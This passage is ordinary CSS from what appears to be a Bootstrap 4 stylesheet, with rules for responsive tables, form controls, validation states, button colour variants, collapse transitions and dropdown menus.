        -ms-overflow-style: -ms-autohiding-scrollbar
      }

      .table-responsive-lg>.table-bordered {
        border: 0
      }
    }

    @media (max-width:1199.98px) {
      .table-responsive-xl {
        display: block;
        width: 100%;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
        -ms-overflow-style: -ms-autohiding-scrollbar
      }

      .table-responsive-xl>.table-bordered {
        border: 0
      }
    }

    .table-responsive {
      display: block;
      width: 100%;
      overflow-x: auto;
      -webkit-overflow-scrolling: touch;
      -ms-overflow-style: -ms-autohiding-scrollbar
    }

    .table-responsive>.table-bordered {
      border: 0
    }

    .form-control {
      display: block;
      width: 100%;
      height: calc(2.25rem + 2px);
      padding: .375rem .75rem;
      font-size: 1rem;
      line-height: 1.5;
      color: #495057;
      background-color: #fff;
      background-clip: padding-box;
      border: 1px solid #ced4da;
      border-radius: .25rem;
      transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .form-control {
        transition: none
      }
    }

    .form-control::-ms-expand {
      background-color: transparent;
      border: 0
    }

    .form-control:focus {
      color: #495057;
      background-color: #fff;
      border-color: #80bdff;
      outline: 0;
      box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .25)
    }

    .form-control::-webkit-input-placeholder {
      color: #6c757d;
      opacity: 1
    }

    .form-control::-moz-placeholder {
      color: #6c757d;
      opacity: 1
    }

    .form-control:-ms-input-placeholder {
      color: #6c757d;
      opacity: 1
    }

    .form-control::-ms-input-placeholder {
      color: #6c757d;
      opacity: 1
    }

    .form-control::placeholder {
      color: #6c757d;
      opacity: 1
    }

    .form-control:disabled,
    .form-control[readonly] {
      background-color: #e9ecef;
      opacity: 1
    }

    select.form-control:focus::-ms-value {
      color: #495057;
      background-color: #fff
    }

    .form-control-file,
    .form-control-range {
      display: block;
      width: 100%
    }

    .col-form-label {
      padding-top: calc(.375rem + 1px);
      padding-bottom: calc(.375rem + 1px);
      margin-bottom: 0;
      font-size: inherit;
      line-height: 1.5
    }

    .col-form-label-lg {
      padding-top: calc(.5rem + 1px);
      padding-bottom: calc(.5rem + 1px);
      font-size: 1.25rem;
      line-height: 1.5
    }

    .col-form-label-sm {
      padding-top: calc(.25rem + 1px);
      padding-bottom: calc(.25rem + 1px);
      font-size: .875rem;
      line-height: 1.5
    }

    .form-control-plaintext {
      display: block;
      width: 100%;
      padding-top: .375rem;
      padding-bottom: .375rem;
      margin-bottom: 0;
      line-height: 1.5;
      color: #212529;
      background-color: transparent;
      border: solid transparent;
      border-width: 1px 0
    }

    .form-control-plaintext.form-control-lg,
    .form-control-plaintext.form-control-sm {
      padding-right: 0;
      padding-left: 0
    }

    .form-control-sm {
      height: calc(1.8125rem + 2px);
      padding: .25rem .5rem;
      font-size: .875rem;
      line-height: 1.5;
      border-radius: .2rem
    }

    .form-control-lg {
      height: calc(2.875rem + 2px);
      padding: .5rem 1rem;
      font-size: 1.25rem;
      line-height: 1.5;
      border-radius: .3rem
    }

    select.form-control[multiple],
    select.form-control[size] {
      height: auto
    }

    textarea.form-control {
      height: auto
    }

    .form-group {
      margin-bottom: 1rem
    }

    .form-text {
      display: block;
      margin-top: .25rem
    }

    .form-row {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      margin-right: -5px;
      margin-left: -5px
    }

    .form-row>.col,
    .form-row>[class*=col-] {
      padding-right: 5px;
      padding-left: 5px
    }

    .form-check {
      position: relative;
      display: block;
      padding-left: 1.25rem
    }

    .form-check-input {
      position: absolute;
      margin-top: .3rem;
      margin-left: -1.25rem
    }

    .form-check-input:disabled~.form-check-label {
      color: #6c757d
    }

    .form-check-label {
      margin-bottom: 0
    }

    .form-check-inline {
      display: -ms-inline-flexbox;
      display: inline-flex;
      -ms-flex-align: center;
      align-items: center;
      padding-left: 0;
      margin-right: .75rem
    }

    .form-check-inline .form-check-input {
      position: static;
      margin-top: 0;
      margin-right: .3125rem;
      margin-left: 0
    }

    .valid-feedback {
      display: none;
      width: 100%;
      margin-top: .25rem;
      font-size: 80%;
      color: #28a745
    }

    .valid-tooltip {
      position: absolute;
      top: 100%;
      z-index: 5;
      display: none;
      max-width: 100%;
      padding: .25rem .5rem;
      margin-top: .1rem;
      font-size: .875rem;
      line-height: 1.5;
      color: #fff;
      background-color: rgba(40, 167, 69, .9);
      border-radius: .25rem
    }

    .custom-select.is-valid,
    .form-control.is-valid,
    .was-validated .custom-select:valid,
    .was-validated .form-control:valid {
      border-color: #28a745
    }

    .custom-select.is-valid:focus,
    .form-control.is-valid:focus,
    .was-validated .custom-select:valid:focus,
    .was-validated .form-control:valid:focus {
      border-color: #28a745;
      box-shadow: 0 0 0 .2rem rgba(40, 167, 69, .25)
    }

    .custom-select.is-valid~.valid-feedback,
    .custom-select.is-valid~.valid-tooltip,
    .form-control.is-valid~.valid-feedback,
    .form-control.is-valid~.valid-tooltip,
    .was-validated .custom-select:valid~.valid-feedback,
    .was-validated .custom-select:valid~.valid-tooltip,
    .was-validated .form-control:valid~.valid-feedback,
    .was-validated .form-control:valid~.valid-tooltip {
      display: block
    }

    .form-control-file.is-valid~.valid-feedback,
    .form-control-file.is-valid~.valid-tooltip,
    .was-validated .form-control-file:valid~.valid-feedback,
    .was-validated .form-control-file:valid~.valid-tooltip {
      display: block
    }

    .form-check-input.is-valid~.form-check-label,
    .was-validated .form-check-input:valid~.form-check-label {
      color: #28a745
    }

    .form-check-input.is-valid~.valid-feedback,
    .form-check-input.is-valid~.valid-tooltip,
    .was-validated .form-check-input:valid~.valid-feedback,
    .was-validated .form-check-input:valid~.valid-tooltip {
      display: block
    }

    .custom-control-input.is-valid~.custom-control-label,
    .was-validated .custom-control-input:valid~.custom-control-label {
      color: #28a745
    }

    .custom-control-input.is-valid~.custom-control-label::before,
    .was-validated .custom-control-input:valid~.custom-control-label::before {
      background-color: #71dd8a
    }

    .custom-control-input.is-valid~.valid-feedback,
    .custom-control-input.is-valid~.valid-tooltip,
    .was-validated .custom-control-input:valid~.valid-feedback,
    .was-validated .custom-control-input:valid~.valid-tooltip {
      display: block
    }

    .custom-control-input.is-valid:checked~.custom-control-label::before,
    .was-validated .custom-control-input:valid:checked~.custom-control-label::before {
      background-color: #34ce57
    }

    .custom-control-input.is-valid:focus~.custom-control-label::before,
    .was-validated .custom-control-input:valid:focus~.custom-control-label::before {
      box-shadow: 0 0 0 1px #fff, 0 0 0 .2rem rgba(40, 167, 69, .25)
    }

    .custom-file-input.is-valid~.custom-file-label,
    .was-validated .custom-file-input:valid~.custom-file-label {
      border-color: #28a745
    }

    .custom-file-input.is-valid~.custom-file-label::after,
    .was-validated .custom-file-input:valid~.custom-file-label::after {
      border-color: inherit
    }

    .custom-file-input.is-valid~.valid-feedback,
    .custom-file-input.is-valid~.valid-tooltip,
    .was-validated .custom-file-input:valid~.valid-feedback,
    .was-validated .custom-file-input:valid~.valid-tooltip {
      display: block
    }

    .custom-file-input.is-valid:focus~.custom-file-label,
    .was-validated .custom-file-input:valid:focus~.custom-file-label {
      box-shadow: 0 0 0 .2rem rgba(40, 167, 69, .25)
    }

    .invalid-feedback {
      display: none;
      width: 100%;
      margin-top: .25rem;
      font-size: 80%;
      color: #dc3545
    }

    .invalid-tooltip {
      position: absolute;
      top: 100%;
      z-index: 5;
      display: none;
      max-width: 100%;
      padding: .25rem .5rem;
      margin-top: .1rem;
      font-size: .875rem;
      line-height: 1.5;
      color: #fff;
      background-color: rgba(220, 53, 69, .9);
      border-radius: .25rem
    }

    .custom-select.is-invalid,
    .form-control.is-invalid,
    .was-validated .custom-select:invalid,
    .was-validated .form-control:invalid {
      border-color: #dc3545
    }

    .custom-select.is-invalid:focus,
    .form-control.is-invalid:focus,
    .was-validated .custom-select:invalid:focus,
    .was-validated .form-control:invalid:focus {
      border-color: #dc3545;
      box-shadow: 0 0 0 .2rem rgba(220, 53, 69, .25)
    }

    .custom-select.is-invalid~.invalid-feedback,
    .custom-select.is-invalid~.invalid-tooltip,
    .form-control.is-invalid~.invalid-feedback,
    .form-control.is-invalid~.invalid-tooltip,
    .was-validated .custom-select:invalid~.invalid-feedback,
    .was-validated .custom-select:invalid~.invalid-tooltip,
    .was-validated .form-control:invalid~.invalid-feedback,
    .was-validated .form-control:invalid~.invalid-tooltip {
      display: block
    }

    .form-control-file.is-invalid~.invalid-feedback,
    .form-control-file.is-invalid~.invalid-tooltip,
    .was-validated .form-control-file:invalid~.invalid-feedback,
    .was-validated .form-control-file:invalid~.invalid-tooltip {
      display: block
    }

    .form-check-input.is-invalid~.form-check-label,
    .was-validated .form-check-input:invalid~.form-check-label {
      color: #dc3545
    }

    .form-check-input.is-invalid~.invalid-feedback,
    .form-check-input.is-invalid~.invalid-tooltip,
    .was-validated .form-check-input:invalid~.invalid-feedback,
    .was-validated .form-check-input:invalid~.invalid-tooltip {
      display: block
    }

    .custom-control-input.is-invalid~.custom-control-label,
    .was-validated .custom-control-input:invalid~.custom-control-label {
      color: #dc3545
    }

    .custom-control-input.is-invalid~.custom-control-label::before,
    .was-validated .custom-control-input:invalid~.custom-control-label::before {
      background-color: #efa2a9
    }

    .custom-control-input.is-invalid~.invalid-feedback,
    .custom-control-input.is-invalid~.invalid-tooltip,
    .was-validated .custom-control-input:invalid~.invalid-feedback,
    .was-validated .custom-control-input:invalid~.invalid-tooltip {
      display: block
    }

    .custom-control-input.is-invalid:checked~.custom-control-label::before,
    .was-validated .custom-control-input:invalid:checked~.custom-control-label::before {
      background-color: #e4606d
    }

    .custom-control-input.is-invalid:focus~.custom-control-label::before,
    .was-validated .custom-control-input:invalid:focus~.custom-control-label::before {
      box-shadow: 0 0 0 1px #fff, 0 0 0 .2rem rgba(220, 53, 69, .25)
    }

    .custom-file-input.is-invalid~.custom-file-label,
    .was-validated .custom-file-input:invalid~.custom-file-label {
      border-color: #dc3545
    }

    .custom-file-input.is-invalid~.custom-file-label::after,
    .was-validated .custom-file-input:invalid~.custom-file-label::after {
      border-color: inherit
    }

    .custom-file-input.is-invalid~.invalid-feedback,
    .custom-file-input.is-invalid~.invalid-tooltip,
    .was-validated .custom-file-input:invalid~.invalid-feedback,
    .was-validated .custom-file-input:invalid~.invalid-tooltip {
      display: block
    }

    .custom-file-input.is-invalid:focus~.custom-file-label,
    .was-validated .custom-file-input:invalid:focus~.custom-file-label {
      box-shadow: 0 0 0 .2rem rgba(220, 53, 69, .25)
    }

    .form-inline {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-flow: row wrap;
      flex-flow: row wrap;
      -ms-flex-align: center;
      align-items: center
    }

    .form-inline .form-check {
      width: 100%
    }

    @media (min-width:576px) {
      .form-inline label {
        display: -ms-flexbox;
        display: flex;
        -ms-flex-align: center;
        align-items: center;
        -ms-flex-pack: center;
        justify-content: center;
        margin-bottom: 0
      }

      .form-inline .form-group {
        display: -ms-flexbox;
        display: flex;
        -ms-flex: 0 0 auto;
        flex: 0 0 auto;
        -ms-flex-flow: row wrap;
        flex-flow: row wrap;
        -ms-flex-align: center;
        align-items: center;
        margin-bottom: 0
      }

      .form-inline .form-control {
        display: inline-block;
        width: auto;
        vertical-align: middle
      }

      .form-inline .form-control-plaintext {
        display: inline-block
      }

      .form-inline .custom-select,
      .form-inline .input-group {
        width: auto
      }

      .form-inline .form-check {
        display: -ms-flexbox;
        display: flex;
        -ms-flex-align: center;
        align-items: center;
        -ms-flex-pack: center;
        justify-content: center;
        width: auto;
        padding-left: 0
      }

      .form-inline .form-check-input {
        position: relative;
        margin-top: 0;
        margin-right: .25rem;
        margin-left: 0
      }

      .form-inline .custom-control {
        -ms-flex-align: center;
        align-items: center;
        -ms-flex-pack: center;
        justify-content: center
      }

      .form-inline .custom-control-label {
        margin-bottom: 0
      }
    }

    .btn {
      display: inline-block;
      font-weight: 400;
      text-align: center;
      white-space: nowrap;
      vertical-align: middle;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      border: 1px solid transparent;
      padding: .375rem .75rem;
      font-size: 1rem;
      line-height: 1.5;
      border-radius: .25rem;
      transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .btn {
        transition: none
      }
    }

    .btn:focus,
    .btn:hover {
      text-decoration: none
    }

    .btn.focus,
    .btn:focus {
      outline: 0;
      box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .25)
    }

    .btn.disabled,
    .btn:disabled {
      opacity: .65
    }

    .btn:not(:disabled):not(.disabled) {
      cursor: pointer
    }

    a.btn.disabled,
    fieldset:disabled a.btn {
      pointer-events: none
    }

    .btn-primary {
      color: #fff;
      background-color: #007bff;
      border-color: #007bff
    }

    .btn-primary:hover {
      color: #fff;
      background-color: #0069d9;
      border-color: #0062cc
    }

    .btn-primary.focus,
    .btn-primary:focus {
      box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .5)
    }

    .btn-primary.disabled,
    .btn-primary:disabled {
      color: #fff;
      background-color: #007bff;
      border-color: #007bff
    }

    .btn-primary:not(:disabled):not(.disabled).active,
    .btn-primary:not(:disabled):not(.disabled):active,
    .show>.btn-primary.dropdown-toggle {
      color: #fff;
      background-color: #0062cc;
      border-color: #005cbf
    }

    .btn-primary:not(:disabled):not(.disabled).active:focus,
    .btn-primary:not(:disabled):not(.disabled):active:focus,
    .show>.btn-primary.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .5)
    }

    .btn-secondary {
      color: #fff;
      background-color: #6c757d;
      border-color: #6c757d
    }

    .btn-secondary:hover {
      color: #fff;
      background-color: #5a6268;
      border-color: #545b62
    }

    .btn-secondary.focus,
    .btn-secondary:focus {
      box-shadow: 0 0 0 .2rem rgba(108, 117, 125, .5)
    }

    .btn-secondary.disabled,
    .btn-secondary:disabled {
      color: #fff;
      background-color: #6c757d;
      border-color: #6c757d
    }

    .btn-secondary:not(:disabled):not(.disabled).active,
    .btn-secondary:not(:disabled):not(.disabled):active,
    .show>.btn-secondary.dropdown-toggle {
      color: #fff;
      background-color: #545b62;
      border-color: #4e555b
    }

    .btn-secondary:not(:disabled):not(.disabled).active:focus,
    .btn-secondary:not(:disabled):not(.disabled):active:focus,
    .show>.btn-secondary.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(108, 117, 125, .5)
    }

    .btn-success {
      color: #fff;
      background-color: #28a745;
      border-color: #28a745
    }

    .btn-success:hover {
      color: #fff;
      background-color: #218838;
      border-color: #1e7e34
    }

    .btn-success.focus,
    .btn-success:focus {
      box-shadow: 0 0 0 .2rem rgba(40, 167, 69, .5)
    }

    .btn-success.disabled,
    .btn-success:disabled {
      color: #fff;
      background-color: #28a745;
      border-color: #28a745
    }

    .btn-success:not(:disabled):not(.disabled).active,
    .btn-success:not(:disabled):not(.disabled):active,
    .show>.btn-success.dropdown-toggle {
      color: #fff;
      background-color: #1e7e34;
      border-color: #1c7430
    }

    .btn-success:not(:disabled):not(.disabled).active:focus,
    .btn-success:not(:disabled):not(.disabled):active:focus,
    .show>.btn-success.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(40, 167, 69, .5)
    }

    .btn-info {
      color: #fff;
      background-color: #17a2b8;
      border-color: #17a2b8
    }

    .btn-info:hover {
      color: #fff;
      background-color: #138496;
      border-color: #117a8b
    }

    .btn-info.focus,
    .btn-info:focus {
      box-shadow: 0 0 0 .2rem rgba(23, 162, 184, .5)
    }

    .btn-info.disabled,
    .btn-info:disabled {
      color: #fff;
      background-color: #17a2b8;
      border-color: #17a2b8
    }

    .btn-info:not(:disabled):not(.disabled).active,
    .btn-info:not(:disabled):not(.disabled):active,
    .show>.btn-info.dropdown-toggle {
      color: #fff;
      background-color: #117a8b;
      border-color: #10707f
    }

    .btn-info:not(:disabled):not(.disabled).active:focus,
    .btn-info:not(:disabled):not(.disabled):active:focus,
    .show>.btn-info.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(23, 162, 184, .5)
    }

    .btn-warning {
      color: #212529;
      background-color: #ffc107;
      border-color: #ffc107
    }

    .btn-warning:hover {
      color: #212529;
      background-color: #e0a800;
      border-color: #d39e00
    }

    .btn-warning.focus,
    .btn-warning:focus {
      box-shadow: 0 0 0 .2rem rgba(255, 193, 7, .5)
    }

    .btn-warning.disabled,
    .btn-warning:disabled {
      color: #212529;
      background-color: #ffc107;
      border-color: #ffc107
    }

    .btn-warning:not(:disabled):not(.disabled).active,
    .btn-warning:not(:disabled):not(.disabled):active,
    .show>.btn-warning.dropdown-toggle {
      color: #212529;
      background-color: #d39e00;
      border-color: #c69500
    }

    .btn-warning:not(:disabled):not(.disabled).active:focus,
    .btn-warning:not(:disabled):not(.disabled):active:focus,
    .show>.btn-warning.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(255, 193, 7, .5)
    }

    .btn-danger {
      color: #fff;
      background-color: #dc3545;
      border-color: #dc3545
    }

    .btn-danger:hover {
      color: #fff;
      background-color: #c82333;
      border-color: #bd2130
    }

    .btn-danger.focus,
    .btn-danger:focus {
      box-shadow: 0 0 0 .2rem rgba(220, 53, 69, .5)
    }

    .btn-danger.disabled,
    .btn-danger:disabled {
      color: #fff;
      background-color: #dc3545;
      border-color: #dc3545
    }

    .btn-danger:not(:disabled):not(.disabled).active,
    .btn-danger:not(:disabled):not(.disabled):active,
    .show>.btn-danger.dropdown-toggle {
      color: #fff;
      background-color: #bd2130;
      border-color: #b21f2d
    }

    .btn-danger:not(:disabled):not(.disabled).active:focus,
    .btn-danger:not(:disabled):not(.disabled):active:focus,
    .show>.btn-danger.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(220, 53, 69, .5)
    }

    .btn-light {
      color: #212529;
      background-color: #f8f9fa;
      border-color: #f8f9fa
    }

    .btn-light:hover {
      color: #212529;
      background-color: #e2e6ea;
      border-color: #dae0e5
    }

    .btn-light.focus,
    .btn-light:focus {
      box-shadow: 0 0 0 .2rem rgba(248, 249, 250, .5)
    }

    .btn-light.disabled,
    .btn-light:disabled {
      color: #212529;
      background-color: #f8f9fa;
      border-color: #f8f9fa
    }

    .btn-light:not(:disabled):not(.disabled).active,
    .btn-light:not(:disabled):not(.disabled):active,
    .show>.btn-light.dropdown-toggle {
      color: #212529;
      background-color: #dae0e5;
      border-color: #d3d9df
    }

    .btn-light:not(:disabled):not(.disabled).active:focus,
    .btn-light:not(:disabled):not(.disabled):active:focus,
    .show>.btn-light.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(248, 249, 250, .5)
    }

    .btn-dark {
      color: #fff;
      background-color: #343a40;
      border-color: #343a40
    }

    .btn-dark:hover {
      color: #fff;
      background-color: #23272b;
      border-color: #1d2124
    }

    .btn-dark.focus,
    .btn-dark:focus {
      box-shadow: 0 0 0 .2rem rgba(52, 58, 64, .5)
    }

    .btn-dark.disabled,
    .btn-dark:disabled {
      color: #fff;
      background-color: #343a40;
      border-color: #343a40
    }

    .btn-dark:not(:disabled):not(.disabled).active,
    .btn-dark:not(:disabled):not(.disabled):active,
    .show>.btn-dark.dropdown-toggle {
      color: #fff;
      background-color: #1d2124;
      border-color: #171a1d
    }

    .btn-dark:not(:disabled):not(.disabled).active:focus,
    .btn-dark:not(:disabled):not(.disabled):active:focus,
    .show>.btn-dark.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(52, 58, 64, .5)
    }

    .btn-outline-primary {
      color: #007bff;
      background-color: transparent;
      background-image: none;
      border-color: #007bff
    }

    .btn-outline-primary:hover {
      color: #fff;
      background-color: #007bff;
      border-color: #007bff
    }

    .btn-outline-primary.focus,
    .btn-outline-primary:focus {
      box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .5)
    }

    .btn-outline-primary.disabled,
    .btn-outline-primary:disabled {
      color: #007bff;
      background-color: transparent
    }

    .btn-outline-primary:not(:disabled):not(.disabled).active,
    .btn-outline-primary:not(:disabled):not(.disabled):active,
    .show>.btn-outline-primary.dropdown-toggle {
      color: #fff;
      background-color: #007bff;
      border-color: #007bff
    }

    .btn-outline-primary:not(:disabled):not(.disabled).active:focus,
    .btn-outline-primary:not(:disabled):not(.disabled):active:focus,
    .show>.btn-outline-primary.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .5)
    }

    .btn-outline-secondary {
      color: #6c757d;
      background-color: transparent;
      background-image: none;
      border-color: #6c757d
    }

    .btn-outline-secondary:hover {
      color: #fff;
      background-color: #6c757d;
      border-color: #6c757d
    }

    .btn-outline-secondary.focus,
    .btn-outline-secondary:focus {
      box-shadow: 0 0 0 .2rem rgba(108, 117, 125, .5)
    }

    .btn-outline-secondary.disabled,
    .btn-outline-secondary:disabled {
      color: #6c757d;
      background-color: transparent
    }

    .btn-outline-secondary:not(:disabled):not(.disabled).active,
    .btn-outline-secondary:not(:disabled):not(.disabled):active,
    .show>.btn-outline-secondary.dropdown-toggle {
      color: #fff;
      background-color: #6c757d;
      border-color: #6c757d
    }

    .btn-outline-secondary:not(:disabled):not(.disabled).active:focus,
    .btn-outline-secondary:not(:disabled):not(.disabled):active:focus,
    .show>.btn-outline-secondary.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(108, 117, 125, .5)
    }

    .btn-outline-success {
      color: #28a745;
      background-color: transparent;
      background-image: none;
      border-color: #28a745
    }

    .btn-outline-success:hover {
      color: #fff;
      background-color: #28a745;
      border-color: #28a745
    }

    .btn-outline-success.focus,
    .btn-outline-success:focus {
      box-shadow: 0 0 0 .2rem rgba(40, 167, 69, .5)
    }

    .btn-outline-success.disabled,
    .btn-outline-success:disabled {
      color: #28a745;
      background-color: transparent
    }

    .btn-outline-success:not(:disabled):not(.disabled).active,
    .btn-outline-success:not(:disabled):not(.disabled):active,
    .show>.btn-outline-success.dropdown-toggle {
      color: #fff;
      background-color: #28a745;
      border-color: #28a745
    }

    .btn-outline-success:not(:disabled):not(.disabled).active:focus,
    .btn-outline-success:not(:disabled):not(.disabled):active:focus,
    .show>.btn-outline-success.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(40, 167, 69, .5)
    }

    .btn-outline-info {
      color: #17a2b8;
      background-color: transparent;
      background-image: none;
      border-color: #17a2b8
    }

    .btn-outline-info:hover {
      color: #fff;
      background-color: #17a2b8;
      border-color: #17a2b8
    }

    .btn-outline-info.focus,
    .btn-outline-info:focus {
      box-shadow: 0 0 0 .2rem rgba(23, 162, 184, .5)
    }

    .btn-outline-info.disabled,
    .btn-outline-info:disabled {
      color: #17a2b8;
      background-color: transparent
    }

    .btn-outline-info:not(:disabled):not(.disabled).active,
    .btn-outline-info:not(:disabled):not(.disabled):active,
    .show>.btn-outline-info.dropdown-toggle {
      color: #fff;
      background-color: #17a2b8;
      border-color: #17a2b8
    }

    .btn-outline-info:not(:disabled):not(.disabled).active:focus,
    .btn-outline-info:not(:disabled):not(.disabled):active:focus,
    .show>.btn-outline-info.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(23, 162, 184, .5)
    }

    .btn-outline-warning {
      color: #ffc107;
      background-color: transparent;
      background-image: none;
      border-color: #ffc107
    }

    .btn-outline-warning:hover {
      color: #212529;
      background-color: #ffc107;
      border-color: #ffc107
    }

    .btn-outline-warning.focus,
    .btn-outline-warning:focus {
      box-shadow: 0 0 0 .2rem rgba(255, 193, 7, .5)
    }

    .btn-outline-warning.disabled,
    .btn-outline-warning:disabled {
      color: #ffc107;
      background-color: transparent
    }

    .btn-outline-warning:not(:disabled):not(.disabled).active,
    .btn-outline-warning:not(:disabled):not(.disabled):active,
    .show>.btn-outline-warning.dropdown-toggle {
      color: #212529;
      background-color: #ffc107;
      border-color: #ffc107
    }

    .btn-outline-warning:not(:disabled):not(.disabled).active:focus,
    .btn-outline-warning:not(:disabled):not(.disabled):active:focus,
    .show>.btn-outline-warning.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(255, 193, 7, .5)
    }

    .btn-outline-danger {
      color: #dc3545;
      background-color: transparent;
      background-image: none;
      border-color: #dc3545
    }

    .btn-outline-danger:hover {
      color: #fff;
      background-color: #dc3545;
      border-color: #dc3545
    }

    .btn-outline-danger.focus,
    .btn-outline-danger:focus {
      box-shadow: 0 0 0 .2rem rgba(220, 53, 69, .5)
    }

    .btn-outline-danger.disabled,
    .btn-outline-danger:disabled {
      color: #dc3545;
      background-color: transparent
    }

    .btn-outline-danger:not(:disabled):not(.disabled).active,
    .btn-outline-danger:not(:disabled):not(.disabled):active,
    .show>.btn-outline-danger.dropdown-toggle {
      color: #fff;
      background-color: #dc3545;
      border-color: #dc3545
    }

    .btn-outline-danger:not(:disabled):not(.disabled).active:focus,
    .btn-outline-danger:not(:disabled):not(.disabled):active:focus,
    .show>.btn-outline-danger.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(220, 53, 69, .5)
    }

    .btn-outline-light {
      color: #f8f9fa;
      background-color: transparent;
      background-image: none;
      border-color: #f8f9fa
    }

    .btn-outline-light:hover {
      color: #212529;
      background-color: #f8f9fa;
      border-color: #f8f9fa
    }

    .btn-outline-light.focus,
    .btn-outline-light:focus {
      box-shadow: 0 0 0 .2rem rgba(248, 249, 250, .5)
    }

    .btn-outline-light.disabled,
    .btn-outline-light:disabled {
      color: #f8f9fa;
      background-color: transparent
    }

    .btn-outline-light:not(:disabled):not(.disabled).active,
    .btn-outline-light:not(:disabled):not(.disabled):active,
    .show>.btn-outline-light.dropdown-toggle {
      color: #212529;
      background-color: #f8f9fa;
      border-color: #f8f9fa
    }

    .btn-outline-light:not(:disabled):not(.disabled).active:focus,
    .btn-outline-light:not(:disabled):not(.disabled):active:focus,
    .show>.btn-outline-light.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(248, 249, 250, .5)
    }

    .btn-outline-dark {
      color: #343a40;
      background-color: transparent;
      background-image: none;
      border-color: #343a40
    }

    .btn-outline-dark:hover {
      color: #fff;
      background-color: #343a40;
      border-color: #343a40
    }

    .btn-outline-dark.focus,
    .btn-outline-dark:focus {
      box-shadow: 0 0 0 .2rem rgba(52, 58, 64, .5)
    }

    .btn-outline-dark.disabled,
    .btn-outline-dark:disabled {
      color: #343a40;
      background-color: transparent
    }

    .btn-outline-dark:not(:disabled):not(.disabled).active,
    .btn-outline-dark:not(:disabled):not(.disabled):active,
    .show>.btn-outline-dark.dropdown-toggle {
      color: #fff;
      background-color: #343a40;
      border-color: #343a40
    }

    .btn-outline-dark:not(:disabled):not(.disabled).active:focus,
    .btn-outline-dark:not(:disabled):not(.disabled):active:focus,
    .show>.btn-outline-dark.dropdown-toggle:focus {
      box-shadow: 0 0 0 .2rem rgba(52, 58, 64, .5)
    }

    .btn-link {
      font-weight: 400;
      color: #007bff;
      background-color: transparent
    }

    .btn-link:hover {
      color: #0056b3;
      text-decoration: underline;
      background-color: transparent;
      border-color: transparent
    }

    .btn-link.focus,
    .btn-link:focus {
      text-decoration: underline;
      border-color: transparent;
      box-shadow: none
    }

    .btn-link.disabled,
    .btn-link:disabled {
      color: #6c757d;
      pointer-events: none
    }

    .btn-group-lg>.btn,
    .btn-lg {
      padding: .5rem 1rem;
      font-size: 1.25rem;
      line-height: 1.5;
      border-radius: .3rem
    }

    .btn-group-sm>.btn,
    .btn-sm {
      padding: .25rem .5rem;
      font-size: .875rem;
      line-height: 1.5;
      border-radius: .2rem
    }

    .btn-block {
      display: block;
      width: 100%
    }

    .btn-block+.btn-block {
      margin-top: .5rem
    }

    input[type=button].btn-block,
    input[type=reset].btn-block,
    input[type=submit].btn-block {
      width: 100%
    }

    .fade {
      transition: opacity .15s linear
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .fade {
        transition: none
      }
    }

    .fade:not(.show) {
      opacity: 0
    }

    .collapse:not(.show) {
      display: none
    }

    .collapsing {
      position: relative;
      height: 0;
      overflow: hidden;
      transition: height .35s ease
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .collapsing {
        transition: none
      }
    }

    .dropdown,
    .dropleft,
    .dropright,
    .dropup {
      position: relative
    }

    .dropdown-toggle::after {
      display: inline-block;
      width: 0;
      height: 0;
      margin-left: .255em;
      vertical-align: .255em;
      content: "";
      border-top: .3em solid;
      border-right: .3em solid transparent;
      border-bottom: 0;
      border-left: .3em solid transparent
    }

    .dropdown-toggle:empty::after {
      margin-left: 0
    }

    .dropdown-menu {
      position: absolute;
      top: 100%;
      left: 0;
      z-index: 1000;
      display: none;
      float: left;
      min-width: 10rem;
      padding: .5rem 0;
      margin: .125rem 0 0;
      font-size: 1rem;
      color: #212529;
      text-align: left;
      list-style: none;
      background-color: #fff;
      background-clip: padding-box;
      border: 1px solid rgba(0, 0, 0, .15);
      border-radius: .25rem
    }

    .dropdown-menu-right {
      right: 0;
      left: auto
    }

    .dropup .dropdown-menu {
      top: auto;
      bottom: 100%;
      margin-top: 0;
      margin-bottom: .125rem
    }

    .dropup .dropdown-toggle::after {
      display: inline-block;
      width: 0;
      height: 0;
      margin-left: .255em;
      vertical-align: .255em;
      content: "";
      border-top: 0;
      border-right: .3em solid transparent;
      border-bottom: .3em solid;
      border-left: .3em solid transparent
    }

    .dropup .dropdown-toggle:empty::after {
      margin-left: 0
    }

    .dropright .dropdown-menu {
      top: 0;
      right: auto;
      left: 100%;
      margin-top: 0;
      margin-left: .125rem
    }

    .dropright .dropdown-toggle::after {
      display: inline-block;
      width: 0;
      height: 0;
      margin-left: .255em;
      vertical-align: .255em;
      content: "";
      border-top: .3em solid transparent;
      border-right: 0;
      border-bottom: .3em solid transparent;
      border-left: .3em solid
    }

    .dropright .dropdown-toggle:empty::after {
      margin-left: 0
    }

